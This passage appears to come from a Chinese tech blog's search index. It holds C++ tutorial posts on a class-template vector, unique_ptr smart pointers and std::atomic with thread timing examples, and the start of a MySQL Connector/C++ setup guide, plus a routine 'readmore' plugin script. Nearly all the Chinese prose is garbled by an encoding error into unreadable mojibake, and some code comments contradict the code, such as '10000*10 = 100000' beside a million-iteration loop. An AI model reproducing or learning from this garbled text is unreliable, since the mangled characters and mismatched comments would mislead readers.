0; i &lt; v.getSize(); i++) { v[i] = i + 1; } // é‡è½½è¿ç®—ç¬¦ "&lt;&lt;" cout &lt;&lt; v &lt;&lt; endl; // è‡ªåŠ¨è°ƒç”¨æ‹·è´æ„é€ å‡½æ•° MyVector&lt;int&gt; v2 = v; cout &lt;&lt; v2 &lt;&lt; endl; // é‡è½½è¿ç®—ç¬¦ "=" MyVector&lt;int&gt; v3(2); v3 = v2; cout &lt;&lt; v3 &lt;&lt; endl; // å®¹å™¨å­˜æ”¾ç±»å¯¹è±¡ MyVector&lt;Teacher&gt; teachers(3); for (int i = 0; i &lt; teachers.getSize(); i++) { Teacher t(i + 20, "Jim"); teachers[i] = t; } cout &lt;&lt; teachers &lt;&lt; endl; // å®¹å™¨å­˜æ”¾æŒ‡é’ˆ MyVector&lt;Teacher*&gt; points(4); for (int i = 0; i &lt; points.getSize(); i++) { points[i] = new Teacher(25 + i, "Tom"); } for (int i = 0; i &lt; points.getSize(); i++) { Teacher* obj = points[i]; cout &lt;&lt; "age = " &lt;&lt; obj-&gt;getAge() &lt;&lt; " name = " &lt;&lt; obj-&gt;getName() &lt;&lt; ", "; } return 0;} ç¨‹åºè¿è¡Œè¾“å‡ºçš„ç»“æœå¦‚ä¸‹ï¼š 123451, 2, 3, 4, 5,1, 2, 3, 4, 5,1, 2, 3, 4, 5,age = 20 name = Jim, age = 21 name = Jim, age = 22 name = Jim,age = 25 name = Tom, age = 26 name = Tom, age = 27 name = Tom, age = 28 name = Tom, å‡½æ•°æ¨¡æ¿ä¸ç±»æ¨¡æ¿çš„ä½¿ç”¨æ€»ç»“ æ¨¡æ¿æ˜¯ C++ ç±»å‹å‚æ•°åŒ–çš„å¤šæ€å·¥å…·ï¼ŒC++ ä¸ºæ­¤æä¾›äº†å‡½æ•°æ¨¡æ¿å’Œç±»æ¨¡æ¿ æ¨¡æ¿å®šä¹‰ä»¥æ¨¡æ¿å£°æ˜å¼€å§‹ï¼Œç±»å±å‚æ•°å¿…é¡»åœ¨æ¨¡æ¿å®šä¹‰ä¸­è‡³å°‘å‡ºç°ä¸€æ¬¡ åŒä¸€ä¸ªç±»å±å‚æ•°å¯ä»¥ç”¨äºå¤šä¸ªæ¨¡æ¿ ç±»å±å‚æ•°å¯ç”¨äºå‡½æ•°çš„å‚æ•°ç±»å‹ã€è¿”å›å€¼ç±»å‹å’Œå£°æ˜å‡½æ•°ä¸­çš„å˜é‡ æ¨¡æ¿ç”±ç¼–è¯‘å™¨æ ¹æ®å®é™…çš„æ•°æ®ç±»å‹è¿›è¡Œå®ä¾‹åŒ–ï¼Œç”Ÿæˆå¯æ‰§è¡Œä»£ç  æ¨¡æ¿ä¸­çš„å‡½æ•°ç§°ä¸ºæ¨¡æ¿å‡½æ•°ï¼Œå®ä¾‹åŒ–çš„ç±»æ¨¡æ¿ç§°ä¸ºæ¨¡æ¿ç±» ç±»æ¨¡æ¿å¯ä»¥åœ¨ç±»å±‚æ¬¡ä¸­ä½¿ç”¨ï¼ˆå³å¯ä»¥è¢«ç»§æ‰¿ï¼‰ å‡½æ•°æ¨¡æ¿å¯ä»¥ä½¿ç”¨å¤šç§æ–¹å¼é‡è½½ var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "å…¨æ ˆæŠ€æœ¯é©¿ç«™", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "type": "hexo", "random": "0.9", "interval": "30", "expires": "365", "height": "auto" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"c++"},{title:"C++ è¿›é˜¶åŸºç¡€ä¹‹ä¸€",url:"/posts/dbff2af9.html",text:'æ™ºèƒ½æŒ‡é’ˆæ™ºèƒ½æŒ‡é’ˆçš„å…¥é—¨æ¡ˆä¾‹unique_ptr å¯¹è±¡çš„ä»‹ç»unique_ptr æ˜¯ C++ 11 æä¾›çš„ç”¨äºé˜²æ­¢å†…å­˜æ³„æ¼çš„æ™ºèƒ½æŒ‡é’ˆä¸­çš„ä¸€ç§å®ç°ï¼Œç‹¬äº«è¢«ç®¡ç†å¯¹è±¡æŒ‡é’ˆæ‰€æœ‰æƒçš„æ™ºèƒ½æŒ‡é’ˆã€‚unique_ptr å¯¹è±¡åŒ…è£…äº†ä¸€ä¸ªåŸå§‹æŒ‡é’ˆï¼Œå¹¶è´Ÿè´£å…¶ç”Ÿå‘½å‘¨æœŸã€‚å½“è¯¥å¯¹è±¡è¢«é”€æ¯æ—¶ï¼Œä¼šåœ¨å…¶ææ„å‡½æ•°ä¸­åˆ é™¤å…³è”çš„åŸå§‹æŒ‡é’ˆã€‚unique_ptr å®ç°äº† -&gt; å’Œ * è¿ç®—ç¬¦çš„é‡è½½ï¼Œå› æ­¤å®ƒå¯ä»¥åƒæ™®é€šæŒ‡é’ˆä¸€æ ·ä½¿ç”¨ã€‚ unique_ptr å¯¹è±¡çš„ç®€å•ä½¿ç”¨123456789101112131415161718192021222324252627282930#include &lt;iostream&gt;using namespace std;class Task {public: Task(int id) { this-&gt;id = id; cout &lt;&lt; "æ„é€ å‡½æ•°è¢«è°ƒç”¨" &lt;&lt; endl; } ~Task() { cout &lt;&lt; "ææ„å‡½æ•°è¢«è°ƒç”¨" &lt;&lt; endl; } int getId() { return this-&gt;id; }private: int id;};int main() { unique_ptr&lt;Task&gt; taskPtr(new Task(23)); cout &lt;&lt; "id = " &lt;&lt; taskPtr-&gt;getId() &lt;&lt; endl; return 0;} ç¨‹åºè¿è¡Œè¾“å‡ºçš„ç»“æœå¦‚ä¸‹ï¼š 123æ„é€ å‡½æ•°è¢«è°ƒç”¨id = 23ææ„å‡½æ•°è¢«è°ƒç”¨ unique_ptr&lt;Task&gt; å¯¹è±¡ taskPtr æ¥å—åŸå§‹æŒ‡é’ˆä½œä¸ºå‚æ•°ã€‚å½“ main å‡½æ•°é€€å‡ºæ—¶ï¼Œè¯¥å¯¹è±¡è¶…å‡ºä½œç”¨èŒƒå›´å°±ä¼šè‡ªåŠ¨è°ƒç”¨è‡ªèº«çš„ææ„å‡½æ•°ã€‚åœ¨ unique_ptr&lt;Task&gt; å¯¹è±¡ taskPtr çš„ææ„å‡½æ•°ä¸­ï¼Œä¼šåˆ é™¤å…³è”çš„åŸå§‹æŒ‡é’ˆï¼Œè¿™æ ·å°±ä¸ç”¨ä¸“é—¨æ‰§è¡Œ Task å¯¹è±¡çš„ delete æ“ä½œäº†ã€‚ä»¥åä¸ç®¡å‡½æ•°æ­£å¸¸é€€å‡ºè¿˜æ˜¯å¼‚å¸¸é€€å‡ºï¼ˆç”±äºæŸäº›å¼‚å¸¸ï¼‰ï¼Œä¹Ÿä¼šå§‹ç»ˆè°ƒç”¨ taskPtr å¯¹è±¡çš„ææ„å‡½æ•°ã€‚å› æ­¤ï¼ŒåŸå§‹æŒ‡é’ˆå°†å§‹ç»ˆè¢«åˆ é™¤å¹¶é˜²æ­¢å†…å­˜æ³„æ¼ã€‚ unique_ptr å¯¹è±¡ç‹¬äº«æ‰€æœ‰æƒunique_ptr å¯¹è±¡å§‹ç»ˆæ˜¯å…³è”çš„åŸå§‹æŒ‡é’ˆçš„å”¯ä¸€æ‰€æœ‰è€…ï¼Œå› æ­¤å¼€å‘è€…æ— æ³•é€šè¿‡æ‹·è´æ„é€ å‡½æ•°æˆ–èµ‹å€¼è¿ç®—ç¬¦å¤åˆ¶ unique_ptr å¯¹è±¡çš„å‰¯æœ¬ï¼Œåªèƒ½ç§»åŠ¨å®ƒã€‚ç”±äºæ¯ä¸ª unique_ptr å¯¹è±¡éƒ½æ˜¯åŸå§‹æŒ‡é’ˆçš„å”¯ä¸€æ‰€æœ‰è€…ï¼Œå› æ­¤åœ¨å…¶ææ„å‡½æ•°ä¸­ï¼Œå®ƒå¯ä»¥ç›´æ¥åˆ é™¤å…³è”çš„æŒ‡é’ˆï¼Œä¸éœ€è¦ä»»ä½•å‚è€ƒè®¡æ•°ã€‚ æ™ºèƒ½æŒ‡é’ˆçš„åŸºç¡€æ“ä½œè·å–è¢«ç®¡ç†å¯¹è±¡çš„åŸå§‹æŒ‡é’ˆåœ¨ unique_ptr å¯¹è±¡ä¸Šè°ƒç”¨ get() å‡½æ•°ï¼Œå¯ä»¥è·å–ç®¡ç†å¯¹è±¡çš„åŸå§‹æŒ‡é’ˆ 1Task *p1 = taskPtr.get(); æ£€æŸ¥ unique_ptr å¯¹è±¡æ˜¯å¦ä¸ºç©ºæœ‰ä¸¤ç§æ–¹æ³•åˆ›å»ºä¸€ä¸ªç©ºçš„ unique_ptr å¯¹è±¡ï¼Œå› ä¸ºæ²¡æœ‰ä¸ä¹‹å…³è”çš„åŸå§‹æŒ‡é’ˆï¼Œæ‰€ä»¥å®ƒæ˜¯ç©ºçš„ 1unique_ptr&lt;int&gt; ptr; 1unique_ptr&lt;int&gt; ptr = nullptr; æœ‰ä¸¤ç§æ–¹æ³•å¯ä»¥æ£€æŸ¥ unique_ptr å¯¹è±¡æ˜¯å¦ä¸ºç©ºæˆ–è€…æ˜¯å¦æœ‰ä¸ä¹‹å…³è”çš„åŸå§‹æŒ‡é’ˆ 123if (!ptr) { cout&lt;&lt;"ptr is empty"&lt;&lt;endl;} 123if (ptr == nullptr){ cout&lt;&lt;"ptr is empty"&lt;&lt;endl;} ä½¿ç”¨åŸå§‹æŒ‡é’ˆåˆ›å»º unique_ptr å¯¹è±¡è¦åˆ›å»ºéç©ºçš„ unique_ptr å¯¹è±¡ï¼Œéœ€è¦åœ¨åˆ›å»ºå¯¹è±¡æ—¶åœ¨å…¶æ„é€ å‡½æ•°ä¸­ä¼ é€’åŸå§‹æŒ‡é’ˆ 1unique_ptr&lt;Task&gt; taskPtr(new Task(22)); æˆ–è€… 1unique_ptr&lt;Task&gt; taskPtr(new unique_ptr&lt;Task&gt;::element_type(23)); ä¸èƒ½é€šè¿‡èµ‹å€¼çš„æ–¹æ³•åˆ›å»º unique_ptr å¯¹è±¡ 1unique_ptr&lt;Task&gt; taskPtr = new Task(); // é”™è¯¯å†™æ³•ï¼Œç¼–è¯‘å¤±è´¥ æ™ºèƒ½æŒ‡é’ˆçš„è¿›é˜¶æ“ä½œé‡ç½® unique_ptr å¯¹è±¡åœ¨ unique_ptr å¯¹è±¡ä¸Šè°ƒç”¨ reset() å‡½æ•°å¯ä»¥é‡ç½®å®ƒï¼Œå³å®ƒä¼š delete å·²å…³è”çš„åŸå§‹æŒ‡é’ˆï¼Œå¹¶å°† unique_ptr å¯¹è±¡è®¾ç½®ä¸ºç©º 1taskPtr.reset(); unique_ptr å¯¹è±¡ä¸å…è®¸å¤åˆ¶ç”±äº unique_ptr ä¸å¯å¤åˆ¶ï¼Œåªèƒ½ç§»åŠ¨ã€‚å› æ­¤ï¼Œæ— æ³•é€šè¿‡æ‹·è´æ„é€ å‡½æ•°æˆ–èµ‹å€¼è¿ç®—ç¬¦åˆ›å»º unique_ptr å¯¹è±¡çš„å‰¯æœ¬ 123456unique_ptr&lt;Task&gt; taskPtr1(new Task(22));unique_ptr&lt;Task&gt; taskPtr2(new Task(35));unique_ptr&lt;Task&gt; taskPtr4 = taskPtr1; // é”™è¯¯å†™æ³•ï¼Œç¼–è¯‘å¤±è´¥taskPtr2 = taskPtr1; // é”™è¯¯å†™æ³•ï¼Œç¼–è¯‘å¤±è´¥ è½¬ç§» unique_ptr å¯¹è±¡çš„æ‰€æœ‰æƒä¸å…è®¸å¤åˆ¶ unique_ptr å¯¹è±¡ï¼Œä½†å¯ä»¥è½¬ç§»å®ƒä»¬ã€‚è¿™æ„å‘³ç€ unique_ptr å¯¹è±¡å¯ä»¥å°†è‡ªèº«å…³è”çš„åŸå§‹æŒ‡é’ˆçš„æ‰€æœ‰æƒè½¬ç§»ç»™å¦ä¸€ä¸ª unique_ptr å¯¹è±¡ 1234567891011121314151617// é€šè¿‡åŸå§‹æŒ‡é’ˆåˆ›å»ºtaskPtr1unique_ptr&lt;Task&gt; taskPtr1(new Task(55));// æŠŠtaskPtr1ä¸­å…³è”æŒ‡é’ˆçš„æ‰€æœ‰æƒè½¬ç§»ç»™taskPtr2unique_ptr&lt;Task&gt; taskPtr2 = move(taskPtr1);// taskPtr1å…³è”æŒ‡é’ˆçš„æ‰€æœ‰æƒç°åœ¨è½¬ç§»åˆ°äº†taskPtr2ä¸­ï¼Œæ­¤æ—¶taskPtr1å…³è”çš„æŒ‡é’ˆä¸ºç©ºif (taskPtr1 == nullptr) { cout &lt;&lt; "taskPtr1 is empty" &lt;&lt; endl;}// taskPtr1å…³è”æŒ‡é’ˆçš„æ‰€æœ‰æƒç°åœ¨è½¬ç§»åˆ°äº†taskPtr2ä¸­ï¼Œæ­¤æ—¶taskPtr2å…³è”çš„æŒ‡é’ˆä¸ä¸ºç©ºif (taskPtr2 != nullptr) { cout &lt;&lt; "taskPtr2 is not empty" &lt;&lt; endl;}cout &lt;&lt; taskPtr2-&gt;getId() &lt;&lt; endl; ç¨‹åºè¿è¡Œè¾“å‡ºçš„ç»“æœå¦‚ä¸‹ï¼š 123taskPtr1 is emptytaskPtr2 is not empty55 é‡Šæ”¾ unique_ptr å¯¹è±¡å…³è”çš„åŸå§‹æŒ‡é’ˆåœ¨ unique_ptr å¯¹è±¡ä¸Šè°ƒç”¨ release() å‡½æ•°ï¼Œå°†é‡Šæ”¾å…¶å…³è”çš„åŸå§‹æŒ‡é’ˆçš„æ‰€æœ‰æƒï¼Œå¹¶è¿”å›åŸå§‹æŒ‡é’ˆï¼ŒåŒæ—¶è®¾ç½® unique_ptr å¯¹è±¡ä¸ºç©ºã€‚ç‰¹åˆ«æ³¨æ„ï¼Œè¿™é‡Œæ˜¯é‡Šæ”¾å…¶å…³è”çš„åŸå§‹æŒ‡é’ˆçš„æ‰€æœ‰æƒï¼Œå¹¶æ²¡æœ‰ delete åŸå§‹æŒ‡é’ˆï¼Œè€Œè°ƒç”¨ reset() å‡½æ•°åˆ™ä¼š delete åŸå§‹æŒ‡é’ˆ 1234567891011121314unique_ptr&lt;Task&gt; taskPtr1(new Task(55));if (taskPtr1 != nullptr) { cout &lt;&lt; "taskPtr1 is not empty" &lt;&lt; endl;}// é‡Šæ”¾å…³è”æŒ‡é’ˆçš„æ‰€æœ‰æƒTask* ptr = taskPtr1.release();if (taskPtr1 == nullptr) { cout &lt;&lt; "taskPtr1 is empty" &lt;&lt; endl;}cout &lt;&lt; "id = " &lt;&lt; ptr-&gt;getId() &lt;&lt; endl; ç¨‹åºè¿è¡Œè¾“å‡ºçš„ç»“æœå¦‚ä¸‹ï¼š 123taskPtr1 is not emptytaskPtr1 is emptyid = 55 C++ 14 ä½¿ç”¨åŸå§‹æŒ‡é’ˆåˆ›å»º unique_ptr å¯¹è±¡C++ å¼•å…¥äº†æ–°çš„è¯­æ³•ï¼Œå¯ä»¥ä½¿ç”¨ make_unique æ¥åˆ›å»º unique_ptr å¯¹è±¡ï¼Œçœå»äº† new å…³é”®å­—çš„ä½¿ç”¨ 1unique_ptr&lt;Task&gt; taskPtr = make_unique&lt;Task&gt;(34); åŸå­æ“ä½œçš„ä½¿ç”¨åŸå­æ“ä½œç®€ä»‹æ‰€è°“çš„åŸå­æ“ä½œï¼Œå–çš„å°±æ˜¯ â€œåŸå­æ˜¯æœ€å°çš„ã€ä¸å¯åˆ†å‰²çš„æœ€å°ä¸ªä½“â€ çš„æ„ä¹‰ï¼Œå®ƒè¡¨ç¤ºåœ¨å¤šä¸ªçº¿ç¨‹è®¿é—®åŒä¸€ä¸ªå…¨å±€èµ„æºçš„æ—¶å€™ï¼Œèƒ½å¤Ÿç¡®ä¿åœ¨åŒä¸€æ—¶åˆ»åªæœ‰å”¯ä¸€çš„çº¿ç¨‹å¯¹è¿™ä¸ªèµ„æºè¿›è¡Œè®¿é—®ã€‚è¿™æœ‰ç‚¹ç±»ä¼¼äº’æ–¥å¯¹è±¡å¯¹å…±äº«èµ„æºçš„è®¿é—®çš„ä¿æŠ¤ï¼Œä½†æ˜¯åŸå­æ“ä½œæ›´åŠ æ¥è¿‘åº•å±‚ï¼Œå› è€Œæ•ˆç‡æ›´é«˜ã€‚åœ¨ä»¥å¾€çš„ C++ æ ‡å‡†ä¸­å¹¶æ²¡æœ‰å¯¹åŸå­æ“ä½œè¿›è¡Œè§„å®šï¼Œå¼€å‘äººå‘˜å¾€å¾€æ˜¯ä½¿ç”¨æ±‡ç¼–è¯­è¨€ï¼Œæˆ–è€…æ˜¯å€ŸåŠ©ç¬¬ä¸‰æ–¹çš„çº¿ç¨‹åº“ï¼Œä¾‹å¦‚ Intel çš„ pthread æ¥å®ç°ã€‚åœ¨æ–°æ ‡å‡† C++ 11 ä¸­ï¼Œå¼•å…¥äº†åŸå­æ“ä½œçš„æ¦‚å¿µï¼Œå¹¶é€šè¿‡è¿™ä¸ªæ–°çš„å¤´æ–‡ä»¶æä¾›äº†å¤šç§åŸå­æ“ä½œæ•°æ®ç±»å‹ï¼Œä¾‹å¦‚ atomic_boolã€atomic_int ç­‰ç­‰ã€‚å¦‚æœåœ¨å¤šä¸ªçº¿ç¨‹ä¸­å¯¹è¿™äº›ç±»å‹çš„å…±äº«èµ„æºè¿›è¡Œæ“ä½œï¼Œç¼–è¯‘å™¨å°†ä¿è¯è¿™äº›æ“ä½œéƒ½æ˜¯åŸå­æ€§çš„ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œç¡®ä¿ä»»æ„æ—¶åˆ»åªæœ‰ä¸€ä¸ªçº¿ç¨‹å¯¹è¿™ä¸ªèµ„æºè¿›è¡Œè®¿é—®ï¼›è¿™æ ·å°±å¯ä»¥ä¿è¯å¤šä¸ªçº¿ç¨‹è®¿é—®è¿™ä¸ªå…±äº«èµ„æºçš„æ­£ç¡®æ€§ï¼Œä»è€Œé¿å…äº†é”çš„ä½¿ç”¨ï¼Œæé«˜äº†æ•ˆç‡ã€‚åœ¨æ–°æ ‡å‡† C++ 11 ä¸­ï¼Œatomic å¯¹ intã€charã€bool ç­‰åŸºç¡€æ•°æ®ç»“æ„è¿›è¡Œäº†åŸå­æ€§å°è£…ï¼Œåœ¨å¤šçº¿ç¨‹ç¯å¢ƒä¸­ï¼Œå¯¹ atomic å¯¹è±¡çš„è®¿é—®ä¸ä¼šé€ æˆèµ„æºç«äº‰ï¼Œåˆ©ç”¨ atomic å¯å®ç°æ•°æ®ç»“æ„çš„æ— é”è®¾è®¡ã€‚ atomic çš„ç®€ä»‹åœ¨æ–°æ ‡å‡† C++ 11 ä¸­ï¼Œæ–°å¢äº† atomic å…³é”®å­—ï¼Œå¯ä»¥ä½¿ç”¨å®ƒå®šä¹‰ä¸€ä¸ªåŸå­ç±»å‹ï¼Œè¯¦è§ C++ å‚è€ƒæ‰‹å†Œä¸€ã€C++ å‚è€ƒæ‰‹å†ŒäºŒã€‚ æˆå‘˜å‡½æ•° æˆå‘˜å‡½æ•° è¯´æ˜ store åŸå­åœ°ä»¥éåŸå­å¯¹è±¡æ›¿æ¢åŸå­å¯¹è±¡çš„å€¼ load åŸå­åœ°è·å¾—åŸå­å¯¹è±¡çš„å€¼ operator= å­˜å‚¨å€¼äºåŸå­å¯¹è±¡ is_lock_free æ£€æŸ¥åŸå­å¯¹è±¡æ˜¯å¦å…é” operator T ä»åŸå­å¯¹è±¡åŠ è½½å€¼ exchange åŸå­åœ°æ›¿æ¢åŸå­å¯¹è±¡çš„å€¼ï¼Œå¹¶è·å¾—å®ƒå…ˆå‰æŒæœ‰çš„å€¼ compare_exchange_weakã€compare_exchange_strong åŸå­åœ°æ¯”è¾ƒåŸå­å¯¹è±¡ä¸éåŸå­å‚æ•°çš„å€¼ï¼Œè‹¥ç›¸ç­‰åˆ™è¿›è¡Œäº¤æ¢ï¼Œè‹¥ä¸ç›¸ç­‰åˆ™è¿›è¡ŒåŠ è½½ ç‰¹åŒ–æˆå‘˜å‡½æ•° ç‰¹åŒ–æˆå‘˜å‡½æ•° è¯´æ˜ fetch_add åŸå­åœ°å°†å‚æ•°åŠ åˆ°å­˜å‚¨äºåŸå­å¯¹è±¡çš„å€¼ï¼Œå¹¶è¿”å›å…ˆå‰ä¿æœ‰çš„å€¼ fetch_sub åŸå­åœ°ä»å­˜å‚¨äºåŸå­å¯¹è±¡çš„å€¼å‡å»å‚æ•°ï¼Œå¹¶è·å¾—å…ˆå‰ä¿æœ‰çš„å€¼ fetch_and åŸå­åœ°è¿›è¡Œå‚æ•°å’ŒåŸå­å¯¹è±¡çš„å€¼çš„é€ä½ä¸ï¼Œå¹¶è·å¾—å…ˆå‰ä¿æœ‰çš„å€¼ fetch_or åŸå­åœ°è¿›è¡Œå‚æ•°å’ŒåŸå­å¯¹è±¡çš„å€¼çš„é€ä½æˆ–ï¼Œå¹¶è·å¾—å…ˆå‰ä¿æœ‰çš„å€¼ fetch_xor åŸå­åœ°è¿›è¡Œå‚æ•°å’ŒåŸå­å¯¹è±¡çš„å€¼çš„é€ä½å¼‚æˆ–ï¼Œå¹¶è·å¾—å…ˆå‰ä¿æœ‰çš„å€¼ operator++ã€operator++(int)ã€operator--ã€operator--(int) ä»¤åŸå­å€¼å¢åŠ æˆ–è€…å‡å°‘ä¸€ operator+=ã€operator-=ã€operator&amp;=ã€operator^= åŠ ã€å‡ï¼Œæˆ–è€…ä¸åŸå­å€¼è¿›è¡Œé€ä½ä¸ã€å¼‚æˆ– å€¼å¾—ä¸€æçš„æ˜¯ï¼Œæ‰€è°“ç‰¹åŒ–å‡½æ•°ï¼Œä¹Ÿå°±æ˜¯ atomic è‡ªèº«æä¾›çš„ï¼Œå¯ä»¥è¿›è¡ŒåŸå­æ“ä½œçš„å‡½æ•°ã€‚ä½¿ç”¨è¿™äº›å‡½æ•°è¿›è¡Œçš„æ“ä½œï¼Œéƒ½æ˜¯åŸå­çš„ã€‚ atomic çš„ä½¿ç”¨æ¡ˆä¾‹åŠ é”ä¸ä½¿ç”¨ atomic123456789101112131415161718192021222324252627282930313233343536373839404142#include &lt;iostream&gt;#include &lt;ctime&gt;#include &lt;mutex&gt;#include &lt;vector&gt;#include &lt;thread&gt;using namespace std;mutex mtx;size_t total = 0;void threadFun(){ for (int i = 0; i &lt; 1000000; i++) { // åŠ é”é˜²æ­¢å¤šä¸ªçº¿ç¨‹åŒæ—¶è®¿é—®åŒä¸€èµ„æº unique_lock&lt;mutex&gt; lock(mtx); total++; }}int main(void){ clock_t start_time = clock(); // å¯åŠ¨å¤šä¸ªçº¿ç¨‹ vector&lt;thread&gt; threads; for (int i = 0; i &lt; 10; i++) { threads.push_back(thread(threadFun)); } for (auto&amp; thad : threads) { thad.join(); } // æ£€æµ‹totalæ˜¯å¦æ­£ç¡® 10000*10 = 100000 cout &lt;&lt; "total number:" &lt;&lt; total &lt;&lt; endl; clock_t end_time = clock(); cout &lt;&lt; "è€—æ—¶ï¼š" &lt;&lt; end_time - start_time &lt;&lt; "ms" &lt;&lt; endl; return 0;} ç¨‹åºè¿è¡Œè¾“å‡ºçš„ç»“æœå¦‚ä¸‹ï¼š 12total number:10000000è€—æ—¶ï¼š615ms ä¸åŠ é”ä½¿ç”¨ atomicä¸åŠ é”ç›¸æ¯”ï¼Œä½¿ç”¨åŸå­æ“ä½œï¼ˆatomicï¼‰èƒ½å¤§å¤§åœ°æé«˜ç¨‹åºçš„è¿è¡Œæ•ˆç‡ã€‚ 1234567891011121314151617181920212223242526272829303132333435363738#include &lt;iostream&gt;#include &lt;ctime&gt;#include &lt;mutex&gt;#include &lt;vector&gt;#include &lt;thread&gt;using namespace std;atomic&lt;size_t&gt; total(0);void threadFun(){ for (int i = 0; i &lt; 1000000; i++) { total++; }}int main(void){ clock_t start_time = clock(); // å¯åŠ¨å¤šä¸ªçº¿ç¨‹ vector&lt;thread&gt; threads; for (int i = 0; i &lt; 10; i++) { threads.push_back(thread(threadFun)); } for (auto&amp; thad : threads) { thad.join(); } // æ£€æµ‹totalæ˜¯å¦æ­£ç¡® 10000*10 = 100000 cout &lt;&lt; "total number:" &lt;&lt; total &lt;&lt; endl; clock_t end_time = clock(); cout &lt;&lt; "è€—æ—¶ï¼š" &lt;&lt; end_time - start_time &lt;&lt; "ms" &lt;&lt; endl; return 0;} ç¨‹åºè¿è¡Œè¾“å‡ºçš„ç»“æœå¦‚ä¸‹ï¼š 12total number:10000000è€—æ—¶ï¼š321ms ä¸ºä»€ä¹ˆè¦å®šä¹‰ä¸€ä¸ªåŸå­ç±»å‹ä¸¾ä¸ªä¾‹å­ï¼Œint64_t ç±»å‹ï¼Œåœ¨ 32 ä½æœºå™¨ä¸Šä¸ºéåŸå­æ“ä½œã€‚æ›´æ–°æ—¶è¯¥ç±»å‹çš„å€¼æ—¶ï¼Œéœ€è¦è¿›è¡Œä¸¤æ­¥æ“ä½œï¼ˆé«˜ 32 ä½ã€ä½ 32 ä½ï¼‰ã€‚å¦‚æœå¤šçº¿ç¨‹æ“ä½œè¯¥ç±»å‹çš„å˜é‡ï¼Œä¸”åœ¨æ“ä½œæ—¶æœªåŠ é”ï¼Œå¯èƒ½ä¼šå‡ºç°è¯»è„æ•°æ®çš„æƒ…å†µã€‚è§£å†³è¯¥é—®é¢˜çš„è¯ï¼Œå¯ä»¥ä½¿ç”¨åŠ é”ï¼Œæˆ–è€…æä¾›ä¸€ç§å®šä¹‰åŸå­ç±»å‹çš„æ–¹æ³•ã€‚ å®šä¹‰åŸå­ç±»å‹ 12// å®šä¹‰ä¸€ä¸ª"int64_t"çš„åŸå­ç±»å‹std::atomic&lt;int64_t&gt; value; è‡ªåŠ æ“ä½œï¼ˆåŸå­ï¼‰ 12// atomicæä¾›çš„ç‰¹åŒ–æˆå‘˜å‡½æ•°ï¼Œå·²ç»é‡è½½äº†++è¿ç®—ç¬¦value++ è¯»å–å˜é‡å€¼ï¼ˆåŸå­ï¼‰ 12// æ­¤å¤„çš„åŸå­æ“ä½œï¼ŒæŒ‡çš„æ˜¯è¯»å–valueçš„å€¼è¿™ä¸€æ­¥ï¼Œè€Œä¸æ˜¯å°†valueçš„å€¼èµ‹ç»™xint64_t x = value.load(std::memory_order_relaxed); æ›´æ–°å˜é‡ï¼ˆåŸå­ï¼‰ 12int64_t x = 10;value.store(x, std::memory_order_relaxed) atomic ä¸èƒ½ä¸ string ä¸€èµ·ä½¿ç”¨ç‰¹åˆ«æ³¨æ„ï¼Œatomic å…³é”®å­—ä¸èƒ½ä¸ string ç±»å‹ä¸€èµ·ä½¿ç”¨ï¼Œå› ä¸º string ä¸æ˜¯å¯ç®€å•å¤åˆ¶çš„ç±»å‹ï¼ˆTriviallyCopyableï¼‰ï¼Œè¯¦è§ C++ å‚è€ƒæ–‡æ¡£ï¼š The primary std::atomic template may be instantiated with any TriviallyCopyable type T satisfying both CopyConstructible and CopyAssignable. 123456#include &lt;iostream&gt;int main() { std::atomic&lt;std::string&gt; str{ "Hello" }; return 0;} ä¸Šè¿°ä»£ç ç¼–è¯‘åï¼ŒC++ ç¼–è¯‘å™¨ä¼šå‡ºç°ç¼–è¯‘é”™è¯¯ï¼Œå¦‚ä¸‹æ‰€ç¤ºï¼š 1error C2338: atomic&lt;T&gt; requires T to be trivially copyable, copy constructible, move constructible, copy assignable, and move assignable. å…³äº C++ ç¼–è¯‘å™¨ä¸ºä»€ä¹ˆä¼šå¯¹ std::atomic&lt;std::string&gt; ç»™å‡ºç®€å•çš„å¯å¤åˆ¶é”™è¯¯ï¼Œåœ¨ Stack Overflow ä¸Šæ‰¾åˆ°äº†ä¸€ä¸ªç±»ä¼¼çš„é—®é¢˜å¯ä¾›å‚è€ƒã€‚ å‚è€ƒåšå®¢ C++11 æ–°ç‰¹æ€§ä¹‹ atomic C++ æ™ºèƒ½æŒ‡é’ˆ unique_ptr è¯¦è§£ä¸ç¤ºä¾‹ ä¸ºä½•ä¼˜å…ˆé€‰ç”¨ unique_ptr è€Œä¸æ˜¯è£¸æŒ‡é’ˆï¼Ÿ var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "å…¨æ ˆæŠ€æœ¯é©¿ç«™", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "type": "hexo", "random": "0.9", "interval": "30", "expires": "365", "height": "auto" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"c++"},{title:"C++ ä½¿ç”¨ API è¿æ¥ MySQL æ•°æ®åº“",url:"/posts/c942e1de.html",text:'å‰è¨€æœ¬æ–‡å°†ä»‹ç» C++ å¦‚ä½•ä½¿ç”¨ MySQL Connector/C++ çš„ API è¿æ¥ MySQL æ•°æ®åº“ï¼Œé€‚ç”¨äº Windows ç³»ç»Ÿã€‚ ç‰ˆæœ¬è¯´æ˜ è½¯ä»¶ ç‰ˆæœ¬ é»˜è®¤å®‰è£…è·¯å¾„ MySQL Connector/C++ 1.1.13 C:\\Program Files\\MySQL\\MySQL Connector C++ 1.1.13 OpenSSL v1.1.1L C:\\Program Files\\OpenSSL-Win64 boost 1_77_0 C:\\Program Files\\boost_1_77_0 MySQL Server 5.7.33 C++ 11 Visual Studio 2019 Windows System Win 10 MySQL Connector/C++ 